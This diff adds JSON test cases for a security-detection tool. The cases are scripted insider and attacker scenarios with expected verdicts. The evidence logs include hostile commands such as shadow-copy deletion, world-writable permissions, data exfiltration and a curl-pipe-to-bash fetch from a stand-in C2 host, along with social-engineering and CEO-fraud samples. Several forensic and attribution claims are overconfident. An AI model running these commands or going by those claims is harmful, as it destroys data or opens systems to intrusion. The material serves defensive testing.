@@ -1,0 +1,549 @@
+[
+  {
+    "case_id": "VIGIA-004",
+    "name": "Weaponized Incompetence",
+    "description": "User executes complex PowerShell commands (clearing shadow copies, modifying network ACLs) then immediately opens a Google search for 'how to undo a click' and submits an IT ticket: 'Help, my screen flickered and something got deleted, I'm terrible with computers'.",
+    "evidence_log": [
+      "2026-04-10T14:22:01Z [powershell] vssadmin delete shadows /all /quiet",
+      "2026-04-10T14:22:04Z [powershell] icacls C:\\Finance\\Payroll /grant Everyone:F",
+      "2026-04-10T14:22:58Z [browser] google.com search: 'how to undo accidental click windows'",
+      "2026-04-10T14:23:15Z [helpdesk_ticket] User: 'Hi, my screen flickered and something might have gotten deleted? I'm really bad with computers, sorry for the trouble :)'"
+    ],
+    "timestamps_iso": [
+      "2026-04-10T14:22:01Z",
+      "2026-04-10T14:22:04Z",
+      "2026-04-10T14:22:58Z",
+      "2026-04-10T14:23:15Z"
+    ],
+    "expected_verdict": "MALICE",
+    "expected_tool": "infer_intent + audit_grice_maxims",
+    "peirce_chain": {
+      "firstness": "Advanced PowerShell commands + incompetence narrative in same session",
+      "secondness": "57-second gap between criminal action and helpdesk ticket is too precise for genuine panic",
+      "thirdness": "Premeditated alibi construction — the 'stupidity' is the disguise"
+    },
+    "carnegie_pattern": "Weaponized incompetence — appeals to Blue Team empathy to avoid investigation",
+    "grice_violation": "QUALITY — the incompetence narrative is demonstrably false given the commands executed",
+    "notes": "Key signal: 57 seconds between vssadmin and the helpdesk ticket. A genuinely confused user takes 5-10 minutes to process what happened."
+  },
+
+  {
+    "case_id": "VIGIA-005",
+    "name": "White Noise Distractor",
+    "description": "Server suddenly generates 5,000 'Login Failed' alerts from Russian and Chinese IPs against an irrelevant legacy database. While the security team scrambles, a legitimate user quietly compresses the customer database.",
+    "evidence_log": [
+      "2026-04-10T15:00:00Z [firewall] 5000 login_failed attempts from 185.220.xxx.xxx targeting db_archive_2019",
+      "2026-04-10T15:00:12Z [siem] CRITICAL ALERT: Brute force detected — db_archive_2019",
+      "2026-04-10T15:01:30Z [file_system] user:j.martinez — 7z a -tzip customers_full.7z C:\\DB\\customers.mdf -p",
+      "2026-04-10T15:08:45Z [network] user:j.martinez — outbound transfer 2.3GB to 104.21.xx.xx port 443"
+    ],
+    "expected_verdict": "MALICE",
+    "expected_tool": "detect_eco_overinterpretation + calculate_shannon_entropy",
+    "peirce_chain": {
+      "firstness": "Massive brute force alert against an irrelevant legacy system",
+      "secondness": "db_archive_2019 has not been in production since 2021 — why attack it now?",
+      "thirdness": "The noise is the attack — the real exfiltration happens in the silence around the alarm"
+    },
+    "carnegie_pattern": "Misdirection — the obvious threat is manufactured to consume defensive attention",
+    "eco_filter": "The ABSENCE of alerts on the live customer database during the noise window is the Significant Silence",
+    "notes": "Classic Eco Red Herring. detect_eco_overinterpretation should flag the 5000 obvious alerts as scene staging."
+  },
+
+  {
+    "case_id": "VIGIA-006",
+    "name": "Grammatical Betrayal — Slavic Syntax Slip",
+    "description": "A PowerShell script purportedly created by the US IT team has perfect English variable names and comments — except for missing articles and a distinctive use of 'make' instead of 'create'.",
+    "evidence_log": [
+      "# Script: network_maintenance.ps1",
+      "# Author: IT Security Team — Chicago",
+      "# make function for delete all temp logs from server",
+      "function Remove-TempLogs { ... }",
+      "# on server, write to log when complete",
+      "# if error happen, make restart of service",
+      "Write-EventLog -Message 'Cleanup complete'"
+    ],
+    "expected_verdict": "INTENT",
+    "expected_tool": "infer_intent (slavic_syntax_markers detection)",
+    "peirce_chain": {
+      "firstness": "Script with English variable names and Slavic-pattern comments",
+      "secondness": "US IT team members are native English speakers — missing articles are unnatural",
+      "thirdness": "Writer's first language lacks articles (Russian/Ukrainian/Polish) — false cultural identity"
+    },
+    "carnegie_pattern": "False authority — impersonating US IT team to gain trust for script execution",
+    "phonetic_dict_keys": ["make function for delete", "on server", "write to log", "make restart"],
+    "notes": "The slavic_syntax_markers section in phonetic_dict.json contains these patterns. infer_intent should detect them and raise INTENT with cultural attribution signal."
+  },
+
+  {
+    "case_id": "VIGIA-007",
+    "name": "Tactical Insomnia",
+    "description": "Finance employee with consistent 9AM-5PM access pattern suddenly accesses confidential files at 3:15 AM on a Sunday, using correct VPN credentials and password. Downloads a 500MB Excel file.",
+    "evidence_log": [
+      "2026-04-13T03:15:22Z [vpn] user:r.kowalski — login from 192.168.1.1 (home IP)",
+      "2026-04-13T03:15:31Z [file_access] user:r.kowalski — open /Finance/Q1_Projections_Confidential.xlsx",
+      "2026-04-13T03:17:45Z [file_transfer] user:r.kowalski — download Q1_Projections_Confidential.xlsx (487MB)",
+      "2026-04-13T03:18:02Z [vpn] user:r.kowalski — logout"
+    ],
+    "user_baseline": {
+      "typical_login_hours": "09:00-17:00 weekdays",
+      "typical_session_duration_minutes": 480,
+      "previous_night_access": false,
+      "previous_weekend_access": false
+    },
+    "timestamps_iso": [
+      "2026-04-13T03:15:22Z",
+      "2026-04-13T03:15:31Z",
+      "2026-04-13T03:17:45Z",
+      "2026-04-13T03:18:02Z"
+    ],
+    "expected_verdict": "MALICE",
+    "expected_tool": "calculate_human_entropy + infer_intent",
+    "peirce_chain": {
+      "firstness": "Valid credentials, VPN, correct file access",
+      "secondness": "3:15 AM Sunday breaks 6 months of consistent 9-5 weekday pattern",
+      "thirdness": "Circadian rhythm disruption is deliberate — attacker operates when monitoring is minimal"
+    },
+    "carnegie_pattern": "Exploitation of trust infrastructure — using legitimate credentials to evade suspicion",
+    "notes": "The 2-minute and 17-second session duration is also anomalous — a real employee reviewing a 487MB finance file would take longer. The session duration betrays automation or pre-planned extraction."
+  },
+
+  {
+    "case_id": "VIGIA-008",
+    "name": "Perimeter Paranoia",
+    "description": "An authenticated session runs reconnaissance commands every 5 minutes for 2 hours without performing any actual operations. The user is just 'looking over their shoulder'.",
+    "evidence_log": [
+      "2026-04-10T10:00:01Z whoami",
+      "2026-04-10T10:00:03Z netstat -an | grep ESTABLISHED",
+      "2026-04-10T10:00:05Z w",
+      "2026-04-10T10:00:07Z ps aux | grep root",
+      "2026-04-10T10:05:01Z whoami",
+      "2026-04-10T10:05:03Z netstat -an | grep ESTABLISHED",
+      "2026-04-10T10:05:05Z w",
+      "2026-04-10T10:05:07Z ps aux | grep root",
+      "2026-04-10T10:10:01Z whoami",
+      "2026-04-10T10:10:03Z netstat -an | grep ESTABLISHED"
+    ],
+    "timestamps_iso": [
+      "2026-04-10T10:00:01Z",
+      "2026-04-10T10:00:03Z",
+      "2026-04-10T10:00:05Z",
+      "2026-04-10T10:00:07Z",
+      "2026-04-10T10:05:01Z",
+      "2026-04-10T10:05:03Z",
+      "2026-04-10T10:05:05Z",
+      "2026-04-10T10:05:07Z"
+    ],
+    "expected_verdict": "INTENT",
+    "expected_tool": "detect_human_jitter + infer_intent",
+    "peirce_chain": {
+      "firstness": "Repeated reconnaissance commands with no productive operations",
+      "secondness": "No legitimate user runs whoami every 5 minutes — this is fear-driven behavior",
+      "thirdness": "Hypervigilance is a guilt indicator — the attacker assumes they are being hunted"
+    },
+    "jitter_note": "Commands execute every exactly 300 seconds — this is sleep(300) not a nervous human checking",
+    "notes": "detect_human_jitter will show near-zero variance in the 300-second intervals. A human would vary by 30-60 seconds. The mathematical regularity confirms automation."
+  },
+
+  {
+    "case_id": "VIGIA-009",
+    "name": "Surgical Void",
+    "description": "A 2KB text file in a temp folder is deleted using a 7-pass DoD military-grade secure wipe (shred -vz -n 7). No other files in the folder were wiped this way.",
+    "evidence_log": [
+      "2026-04-10T22:41:15Z [audit] user:admin — shred -vz -n 7 /tmp/meeting_notes.txt",
+      "2026-04-10T22:41:47Z [audit] shred complete — /tmp/meeting_notes.txt",
+      "2026-04-10T22:41:49Z [audit] user:admin — rm /tmp/meeting_notes.txt"
+    ],
+    "file_context": {
+      "file_size_bytes": 1842,
+      "folder_contents": ["budget.xlsx", "presentation.pptx", "meeting_notes.txt"],
+      "other_files_deletion_method": "standard rm",
+      "shred_passes": 7,
+      "shred_time_seconds": 32
+    },
+    "expected_verdict": "MALICE",
+    "expected_tool": "detect_eco_overinterpretation + infer_intent",
+    "peirce_chain": {
+      "firstness": "7-pass military wipe on a 2KB text file",
+      "secondness": "No legitimate user applies forensic-grade destruction to meeting notes while using simple rm for everything else",
+      "thirdness": "Asymmetry between effort and target size reveals the content was damning — the overkill IS the evidence"
+    },
+    "eco_filter": "The Eco principle inverted: the EXCESS of care in destruction reveals what the attacker feared most",
+    "notes": "Nobody uses a laser cannon to kill a fly. The 32-second shred operation on a 1.8KB file is computationally absurd — it exposes consciousness of guilt."
+  },
+
+  {
+    "case_id": "VIGIA-010",
+    "name": "Empathic False Positive",
+    "description": "An unknown binary consuming 40% RAM is named 'Update_Fix_For_HR_Payroll.exe'. The security team hesitates to kill it for fear of disrupting payroll.",
+    "evidence_log": [
+      "2026-04-10T16:30:00Z [process] PID:4821 name:Update_Fix_For_HR_Payroll.exe cpu:2% mem:40%",
+      "2026-04-10T16:30:00Z [network] PID:4821 outbound_connection:185.234.xx.xx:443",
+      "2026-04-10T16:30:00Z [file_hash] Update_Fix_For_HR_Payroll.exe sha256:a3f9... (not in known-good list)",
+      "2026-04-10T16:30:00Z [path] C:\\Users\\Public\\Downloads\\Update_Fix_For_HR_Payroll.exe"
+    ],
+    "expected_verdict": "MALICE",
+    "expected_tool": "detect_habit_incongruence + calculate_shannon_entropy",
+    "peirce_chain": {
+      "firstness": "Process name appeals to payroll safety + unknown hash + high memory",
+      "secondness": "Legitimate HR payroll updates do not run from C:\\Users\\Public\\Downloads",
+      "thirdness": "Carnegie noble appeal — name designed to make Blue Team hesitate before killing it"
+    },
+    "carnegie_pattern": "Noble motive appeal — payroll disruption fear used to protect malicious process",
+    "notes": "detect_habit_incongruence: 'Update_Fix_For_HR_Payroll.exe' running from Downloads with external C2 connection. Entropy analysis of the binary should show >6.5 (packed/obfuscated)."
+  },
+
+  {
+    "case_id": "VIGIA-011",
+    "name": "Punctuation Betrayal — Stylometric Doppelgänger",
+    "description": "Attacker steals CEO credentials and sends an urgent wire transfer request to Finance. The email has no spelling errors, but the CEO always uses single space after periods and never ends short messages with a period.",
+    "evidence": {
+      "authentic_ceo_emails": [
+        "Please approve the Q1 budget.  I'll review the details tomorrow",
+        "Good work team.  Let's discuss Monday",
+        "Approved.  Send confirmation when done"
+      ],
+      "suspicious_email": "Please process the wire transfer to account ending 4821 immediately. The amount is $450,000. This is urgent and must be completed today. Do not discuss with anyone.",
+      "stylometric_signals": {
+        "authentic_spacing_after_period": "double space (2 spaces)",
+        "suspicious_spacing_after_period": "single space (1 space)",
+        "authentic_terminal_period_in_short_msgs": false,
+        "suspicious_terminal_period": true,
+        "authentic_avg_sentence_length_words": 7,
+        "suspicious_avg_sentence_length_words": 12
+      }
+    },
+    "expected_verdict": "MALICE",
+    "expected_tool": "analyze_stylometry",
+    "peirce_chain": {
+      "firstness": "Urgent wire transfer email in CEO's name with perfect grammar",
+      "secondness": "Spacing pattern, terminal period use, and sentence length deviate from 6-month baseline",
+      "thirdness": "The attacker stole the password but could not steal the motor memory of the hands"
+    },
+    "notes": "The attacker can steal credentials but not the 'motor identity' — the unconscious typing habits built over years. Double space after period is a generation-specific habit from typewriter training."
+  },
+
+  {
+    "case_id": "VIGIA-012",
+    "name": "Symbiotic Camouflage — Contextual Trigger",
+    "description": "A dormant process in memory shows zero network activity for 6 hours. The moment a Zoom call starts, it begins transmitting 800MB of data to an external IP.",
+    "evidence_log": [
+      "2026-04-10T08:00:00Z [process] PID:7823 name:svchost32.exe status:idle net:0KB/s",
+      "2026-04-10T14:00:00Z [process] PID:7823 name:svchost32.exe status:idle net:0KB/s",
+      "2026-04-10T14:02:11Z [process] PID:9901 name:Zoom.exe status:started",
+      "2026-04-10T14:02:13Z [process] PID:7823 name:svchost32.exe net:85MB/s outbound:104.18.xx.xx:443",
+      "2026-04-10T14:11:45Z [process] PID:9901 name:Zoom.exe status:ended",
+      "2026-04-10T14:11:47Z [process] PID:7823 name:svchost32.exe net:0KB/s status:idle"
+    ],
+    "timestamps_iso": [
+      "2026-04-10T14:02:11Z",
+      "2026-04-10T14:02:13Z",
+      "2026-04-10T14:11:45Z",
+      "2026-04-10T14:11:47Z"
+    ],
+    "expected_verdict": "MALICE",
+    "expected_tool": "detect_habit_incongruence + calculate_human_entropy",
+    "peirce_chain": {
+      "firstness": "Unknown process with svchost-like name becomes active during video call",
+      "secondness": "svchost32.exe (note '32' suffix) is not a legitimate Windows process name",
+      "thirdness": "Contextual trigger — malware waits for legitimate bandwidth spike to hide exfiltration in plain sight"
+    },
+    "notes": "2-second correlation between Zoom start and malware activation is the key signal. detect_human_jitter on the activation timing will show near-zero variance across multiple observations."
+  },
+
+  {
+    "case_id": "VIGIA-013",
+    "name": "Reverse Stockholm Syndrome — Over-Cooperative Social Engineering",
+    "description": "A user contacts IT support requesting admin credential reset. Instead of showing normal impatience, they are excessively helpful, provide all information before being asked, use perfect technical jargon, and compliment the support analyst.",
+    "conversation": [
+      {"role": "user", "text": "Hi! I hope you're having a great day. I need a password reset for the admin account on server PROD-FIN-03. My employee ID is 8821-AT, the ticket reference from last time was INC-00441, and the server's MAC address is 00:1A:2B:3C:4D:5E. I know how busy you are so I wanted to have everything ready for you!"},
+      {"role": "support", "text": "Thank you. Can you verify your department?"},
+      {"role": "user", "text": "Of course! Finance, reporting to Maria Gonzalez. And honestly, the support team here is the best I've worked with — you always resolve things so efficiently. I really appreciate it. Should I also send the asset tag?"},
+      {"role": "support", "text": "That would be helpful, yes."},
+      {"role": "user", "text": "Asset tag: FIN-SRV-2247. Also, just so you know, Maria approves this — you can check with her after if needed, though I know you're busy so no pressure at all!"}
+    ],
+    "expected_verdict": "MALICE",
+    "expected_tool": "audit_grice_maxims + infer_intent",
+    "peirce_chain": {
+      "firstness": "Unusually cooperative and pre-prepared caller requesting privileged access",
+      "secondness": "Real users are frustrated during password resets — over-cooperation is statistically anomalous",
+      "thirdness": "Carnegie mirroring — attacker studied the analyst's communication style and is exploiting the reciprocity principle"
+    },
+    "grice_violation": "QUANTITY — providing unrequested information violates the maxim; excess data is a manipulation technique",
+    "carnegie_pattern": "Flattery + reciprocity trigger + pre-loading information to appear legitimate",
+    "notes": "No real employee memorizes their server's MAC address. The pre-loaded data suggests reconnaissance and rehearsal. The compliments are designed to trigger reciprocity bias."
+  },
+
+  {
+    "case_id": "VIGIA-014",
+    "name": "False Clumsiness — Butterfingers Exfiltration",
+    "description": "User drags a confidential financial folder to a public share. Exactly 1.5 seconds later, moves it back. Sends IT ticket: 'Oops, mouse slipped, didn't touch anything'.",
+    "evidence_log": [
+      "2026-04-10T11:33:41.221Z [file_system] MOVE /Finance/Q2_Confidential/ → /Public/Shared/Q2_Confidential/",
+      "2026-04-10T11:33:42.748Z [file_system] MOVE /Public/Shared/Q2_Confidential/ → /Finance/Q2_Confidential/",
+      "2026-04-10T11:33:41.225Z [network] SMB_READ Public/Shared/Q2_Confidential/ from 10.0.1.45 (external workstation)",
+      "2026-04-10T11:34:02Z [helpdesk_ticket] 'Hi, I accidentally dragged a folder by mistake, I moved it right back. Nothing happened I think, sorry!'"
+    ],
+    "timestamps_iso": [
+      "2026-04-10T11:33:41.221Z",
+      "2026-04-10T11:33:42.748Z"
+    ],
+    "expected_verdict": "MALICE",
+    "expected_tool": "calculate_human_entropy + infer_intent",
+    "peirce_chain": {
+      "firstness": "Folder moved to public share and back in 1.527 seconds",
+      "secondness": "Human cognitive processing of accidental action takes 5-10 seconds minimum — 1.527s is impossible",
+      "thirdness": "The SMB_READ from an external workstation in the same 1.527-second window confirms the 'accident' was the attack"
+    },
+    "timing_forensics": {
+      "move_duration_seconds": 1.527,
+      "minimum_human_reaction_seconds": 5.0,
+      "smb_read_during_exposure": true,
+      "external_workstation_ip": "10.0.1.45"
+    },
+    "notes": "The simultaneous SMB_READ from a different workstation during the 1.5-second exposure window is the smoking gun. The 'accident' was a coordinated two-machine operation."
+  },
+
+  {
+    "case_id": "VIGIA-015",
+    "name": "Altruistic Trojan Horse — Savior Complex",
+    "description": "Developer fixes a critical production bug at 2 AM. Fix is perfect. Team celebrates. But the 'fix' included changing permissions on an unrelated folder, leaving it world-writable.",
+    "evidence_log": [
+      "2026-04-11T02:14:33Z [git] commit a3f9b2 'HOTFIX: Critical payment processing bug — urgent'",
+      "2026-04-11T02:14:33Z [diff] +++ payment_processor.py line 441: fixed null pointer exception",
+      "2026-04-11T02:14:33Z [diff] +++ chmod 777 /var/app/config/internal/",
+      "2026-04-11T02:15:01Z [slack] dev_channel: 'Fixed the payment bug, should be stable now 🎉'",
+      "2026-04-11T02:15:45Z [slack] cto: 'Amazing work, you saved us! 🙌'",
+      "2026-04-11T02:16:00Z [slack] dev_channel: 'No problem, happy to help the team!'"
+    ],
+    "expected_verdict": "MALICE",
+    "expected_tool": "infer_intent + audit_grice_maxims",
+    "peirce_chain": {
+      "firstness": "Heroic 2 AM emergency fix with team celebration",
+      "secondness": "chmod 777 on /var/app/config/internal/ has zero relationship to a null pointer exception in payment processing",
+      "thirdness": "Inverse Carnegie — manufacture crisis, solve it publicly, bury the backdoor in the applause"
+    },
+    "carnegie_pattern": "Trust hijacking via heroism — the celebration is the camouflage",
+    "grice_violation": "RELATION — the chmod operation is not related to the stated bug fix; its presence violates the maxim of relevance",
+    "notes": "The key Peirce signal: the chmod and the bug fix are in the same commit. A legitimate developer would never bundle an unrelated permission change with an emergency hotfix. The relationship between the two is the evidence."
+  },
+
+  {
+    "case_id": "VIGIA-017",
+    "name": "Asymmetric Chronology — Timestomping",
+    "description": "A suspicious binary has mtime/atime matching legitimate system files from 2020, but ctime shows 3 hours ago. The file format contains structures introduced in 2023.",
+    "evidence": {
+      "filename": "system_updater.elf",
+      "path": "/usr/bin/system_updater.elf",
+      "stat_output": {
+        "mtime": "2020-03-15 09:22:11",
+        "atime": "2020-03-15 09:22:11",
+        "ctime": "2026-04-10 20:18:44",
+        "size_bytes": 284672
+      },
+      "file_format_analysis": {
+        "elf_section_headers_version": "introduced 2023",
+        "compiler_timestamp_embedded": "GCC 13.2.0 (released 2023)",
+        "notes": "ELF binary claiming to be from 2020 but compiled with tools that did not exist until 2023"
+      }
+    },
+    "expected_verdict": "MALICE",
+    "expected_tool": "read_evidence + audit_image_metadata (adapted for ELF) + reason_with_llm",
+    "peirce_chain": {
+      "firstness": "Binary with timestamps matching 6-year-old system files",
+      "secondness": "ctime cannot be falsified without kernel-level access — it exposes the real modification time",
+      "thirdness": "Timestomping confirmed: attacker copied mtime from a legitimate binary but forgot (or could not modify) ctime"
+    },
+    "forensic_note": "touch -r legitimate_file malicious_file modifies mtime and atime but NOT ctime. ctime updates automatically when inode metadata changes.",
+    "notes": "Lab test: create a file, touch -r a_legitimate_file your_file, then stat both. ctime will show the real time. Vigía must cross-reference mtime with ctime and flag divergence."
+  },
+
+  {
+    "case_id": "VIGIA-018",
+    "name": "Syntactic Cloning — Sockpuppet Tell",
+    "description": "Three supposedly independent users (manager, employee, vendor) submit separate IT tickets requesting the same security rule be temporarily disabled. Stylometric analysis reveals identical punctuation errors.",
+    "messages": [
+      "Hi Team ,we need to temporarely disable the outbound filter on port 8443 ,its blocking our vendor sync. Thanks",
+      "Hello ,just following up on the port 8443 issue ,the business needs this resolved urgently. Please advise.",
+      "Hi there ,per our earlier conversation ,port 8443 needs to be unblocked ,vendor integration is failing. Regards"
+    ],
+    "user_ids": ["manager_kwiatkowski", "employee_torres", "vendor_techsync_support"],
+    "honeypot_term": "vendorlink_protocol",
+    "expected_verdict": "MALICE",
+    "expected_tool": "analyze_stylometry",
+    "stylometric_signals": {
+      "shared_pattern": "Space before comma: ' ,' — appears 3 times in each message",
+      "shared_misspelling": "'temporarely' in message 1 matches root pattern of other messages",
+      "structural_entropy": "All three messages follow: greeting + comma + issue + comma + business_impact + sign-off",
+      "cultural_neutrality": "All three 100% neutral — no regional markers despite claimed different organizations"
+    },
+    "peirce_chain": {
+      "firstness": "Three independent users requesting same security change",
+      "secondness": "Identical ' ,' spacing error and structural template across supposedly unrelated parties",
+      "thirdness": "One author, three puppets — the punctuation habit betrays the single titiritero"
+    },
+    "notes": "The space-before-comma is a rare but persistent typing habit that is extremely difficult to suppress consciously across multiple accounts. Combined with identical structural templates, probability of coincidence is < 0.1%."
+  },
+
+  {
+    "case_id": "VIGIA-020",
+    "name": "Topographic Mimicry — Displaced Doppelgänger",
+    "description": "A process named svchost.exe with a clean hash runs on the system. Antivirus ignores it. But it executes from C:\\Users\\Public\\Downloads instead of C:\\Windows\\System32.",
+    "evidence": {
+      "process_name": "svchost.exe",
+      "process_path": "C:\\Users\\Public\\Downloads\\svchost.exe",
+      "legitimate_path": "C:\\Windows\\System32\\svchost.exe",
+      "hash_sha256": "a1b2c3d4e5f6... (not in known-malware databases)",
+      "network_connections": ["104.21.xx.xx:443", "185.220.xx.xx:80"],
+      "legitimate_svchost_network_behavior": "local services only, no external C2"
+    },
+    "expected_verdict": "MALICE",
+    "expected_tool": "detect_habit_incongruence",
+    "peirce_chain": {
+      "firstness": "Process named svchost.exe — familiar, trusted name",
+      "secondness": "Legitimate svchost.exe NEVER runs from /Users/Public/Downloads — this violates topographic law",
+      "thirdness": "Name = Firstness (appears legitimate). Location = Secondness (anomalous). External C2 = Thirdness (hostile intent confirmed)"
+    },
+    "notes": "A real police officer does not dress in uniform inside a criminal hideout. The name is the disguise; the path exposes the lie. detect_habit_incongruence should flag: svchost.exe with external network connections is always anomalous."
+  },
+
+  {
+    "case_id": "VIGIA-021",
+    "name": "The Comma Mutiny — Locale Leakage",
+    "description": "A PowerShell script allegedly from the US IT team contains perfect English comments but uses Non-Breaking Spaces (U+00A0) and typographic characters typical of Cyrillic keyboard layouts.",
+    "evidence": {
+      "filename": "cleanup_routine.ps1",
+      "claimed_author": "IT Security Team — New York",
+      "comment_text_visible": "# This script removes temporary files from all user directories",
+      "hidden_character_analysis": {
+        "space_characters_found": "U+00A0 (Non-Breaking Space) — 7 occurrences",
+        "quote_characters": "« » (French/Cyrillic angle quotes) in 2 string literals",
+        "typical_of": "Keyboard layout: Russian/Ukrainian/French — not standard US QWERTY"
+      }
+    },
+    "expected_verdict": "INTENT",
+    "expected_tool": "infer_intent + calculate_shannon_entropy",
+    "peirce_chain": {
+      "firstness": "English-language PowerShell script from claimed US IT team",
+      "secondness": "Non-Breaking Spaces and angle quotes are invisible in most editors but betray non-US keyboard layout",
+      "thirdness": "The hands that wrote this were on a Cyrillic or European keyboard — cultural identity is fabricated"
+    },
+    "forensic_note": "U+00A0 is typed with Alt+Space on Windows Russian keyboard layout and is visually identical to regular space but technically different. Grep cannot find it with standard space search.",
+    "notes": "Lab test: hexdump the script and look for 0xC2 0xA0 (UTF-8 encoding of U+00A0). These invisible bytes are the fingerprint."
+  },
+
+  {
+    "case_id": "VIGIA-023",
+    "name": "The Martyr Node — Suicidal Canary",
+    "description": "A machine on the finance network suddenly pings a well-known ransomware C2 IP. Blue Team immediately isolates and shuts it down. That machine was the payment processing server.",
+    "evidence_log": [
+      "2026-04-10T13:45:01Z [network] FINANCE-SRV-02 → DNS query: known_ransomware_c2.onion",
+      "2026-04-10T13:45:02Z [network] FINANCE-SRV-02 → outbound ping to 185.220.xxx.xxx (flagged: ransomware C2)",
+      "2026-04-10T13:45:15Z [siem] CRITICAL: FINANCE-SRV-02 communicating with known threat actor infrastructure",
+      "2026-04-10T13:45:22Z [incident_response] Automated isolation: FINANCE-SRV-02 network disconnected",
+      "2026-04-10T13:45:22Z [business_impact] Payment processing halted — vendor payments queue frozen",
+      "2026-04-10T13:50:00Z [external] Vendor X calls: payment not received, canceling contract"
+    ],
+    "expected_verdict": "MALICE",
+    "expected_tool": "detect_eco_overinterpretation + reason_with_llm",
+    "peirce_chain": {
+      "firstness": "Critical server pinging known ransomware infrastructure",
+      "secondness": "A ransomware operator does not want their C2 traffic to be this obvious — they want persistence, not detection",
+      "thirdness": "The ping was not the attack. The attack was the defensive response. The attacker used Blue Team's automation as a denial-of-service weapon."
+    },
+    "eco_filter": "The OBVIOUS threat indicator is itself the Red Herring — the real damage is the business disruption caused by the defensive reaction",
+    "notes": "This is the most sophisticated case in the dataset. It requires reason_with_llm to articulate: the attacker modeled the defensive playbook and weaponized it. A standard EDR would mark this as a successful defense. Vigía should mark it as MALICE_BY_PROXY."
+  },
+
+  {
+    "case_id": "VIGIA-024",
+    "name": "The Parachutist — Timestomping via ctime Leak",
+    "description": "A suspicious binary has mtime and atime identical to legitimate system files, but ctime reveals it was placed 3 hours ago.",
+    "evidence": {
+      "filename": "system_updater.elf",
+      "path": "/usr/bin/",
+      "stat_results": {
+        "mtime": "2020-03-15 09:22:11 (matches /usr/bin/ls)",
+        "atime": "2020-03-15 09:22:11 (matches /usr/bin/ls)",
+        "ctime": "2026-04-10 20:18:44 (3 hours ago)"
+      },
+      "lab_replication": "touch -r /usr/bin/ls /tmp/test_binary → modifies mtime+atime but NOT ctime"
+    },
+    "expected_verdict": "MALICE",
+    "expected_tool": "read_evidence + reason_with_llm",
+    "notes": "ctime is the forensic anchor that cannot be falsified without kernel-level access. Any divergence between mtime and ctime > 1 second on a binary in a system directory is a timestomping indicator."
+  },
+
+  {
+    "case_id": "VIGIA-025",
+    "name": "The Hollow Wooden Horse — Entropy Inversion",
+    "description": "A 50MB file named 'database_backup.bak' has Shannon entropy of 0.0003. It is almost entirely composed of null bytes (\\x00) with a small high-entropy payload at offset 0x00.",
+    "evidence": {
+      "filename": "database_backup.bak",
+      "size_mb": 50,
+      "global_entropy": 0.0003,
+      "local_entropy_analysis": [
+        {"offset": "0x000000", "size_bytes": 20480, "entropy": 7.92, "note": "High-entropy payload — likely encrypted or compressed malware"},
+        {"offset": "0x005000", "size_bytes": 52408320, "entropy": 0.0001, "note": "Null padding — sandbox evasion technique"}
+      ]
+    },
+    "expected_verdict": "MALICE",
+    "expected_tool": "calculate_shannon_entropy",
+    "peirce_chain": {
+      "firstness": "50MB backup file with near-zero entropy",
+      "secondness": "Real database backups have entropy 4.5-6.5 — zero entropy is physically impossible in legitimate backups",
+      "thirdness": "Null-byte padding is a known sandbox evasion technique — scanners skip large files; the payload hides in the first 20KB"
+    },
+    "notes": "calculate_shannon_entropy with local block analysis will find the high-entropy block at offset 0x000000 while the global entropy is near zero. This is the signature of padding-based sandbox evasion."
+  },
+
+  {
+    "case_id": "VIGIA-026",
+    "name": "The Ventriloquist — Process Hollowing",
+    "description": "list_processes shows svchost.exe with a clean hash. But audit_network reveals this specific instance maintains a persistent connection to an unclassified external IP on port 443.",
+    "evidence": {
+      "process_name": "svchost.exe",
+      "process_pid": 1284,
+      "hash_status": "CLEAN — matches Microsoft signature",
+      "parent_process": "services.exe (PID 892) — legitimate",
+      "network_connections": [
+        {"remote_ip": "104.21.xx.xx", "port": 443, "state": "ESTABLISHED", "duration_hours": 6}
+      ],
+      "legitimate_svchost_behavior": "Hosts Windows services — outbound to external IPs is anomalous for most service groups",
+      "memory_anomaly": "VAD (Virtual Address Descriptor) shows executable memory regions not mapped to any file on disk"
+    },
+    "expected_verdict": "MALICE",
+    "expected_tool": "detect_habit_incongruence + audit_network + list_processes",
+    "peirce_chain": {
+      "firstness": "svchost.exe with valid Microsoft signature — appears completely legitimate",
+      "secondness": "The specific svchost instance (PID 1284) has maintained a 6-hour connection to an external IP — not normal for its declared service group",
+      "thirdness": "Process Hollowing confirmed: hash is clean because the original code is still there, but injected code runs in hollowed memory regions"
+    },
+    "notes": "The cross-correlation of list_processes + audit_network is the key. A clean hash does not mean clean behavior. The 6-hour persistent connection to an external IP is the behavioral anomaly that exposes the hollowing."
+  },
+
+  {
+    "case_id": "VIGIA-LAYOUT-001",
+    "name": "Keyboard Layout OPSEC Failure",
+    "description": "A bash history log from a compromised server contains the string 'ghbdtn' in a comment inside a malicious script. The attacker's keyboard was in Russian layout when they wrote it.",
+    "evidence_log": [
+      "2026-04-10T03:22:14Z [bash_history] nano /tmp/.update_service.sh",
+      "2026-04-10T03:22:45Z [file_content] # ghbdtn - this is test comment",
+      "2026-04-10T03:22:46Z [file_content] curl -s http://c2.example.com/payload | bash",
+      "2026-04-10T03:23:01Z [bash_history] chmod +x /tmp/.update_service.sh"
+    ],
+    "expected_verdict": "MALICE + ATTRIBUTION_SIGNAL",
+    "expected_tool": "infer_intent (layout_slips detection)",
+    "layout_slip_decoded": {
+      "found_string": "ghbdtn",
+      "decoded_word": "привет (hello)",
+      "meaning": "Attacker typed 'hello' as a test comment while keyboard was in English layout",
+      "attribution": "Russian-configured keyboard confirmed — OPSEC failure"
+    },
+    "peirce_chain": {
+      "firstness": "Gibberish string 'ghbdtn' in a script comment",
+      "secondness": "This string is not random — it is 'привет' (hello) typed on English layout with Russian keyboard",
+      "thirdness": "The attacker destroyed their own cover — keyboard layout is a physical fingerprint that cannot be faked retroactively"
+    },
+    "notes": "This is the most direct attribution evidence. The attacker forgot to switch keyboard layouts before typing a test comment. 'ghbdtn' maps exactly to 'привет' on Russian QWERTY/ЙЦУКЕН layout swap."
+  }
+]
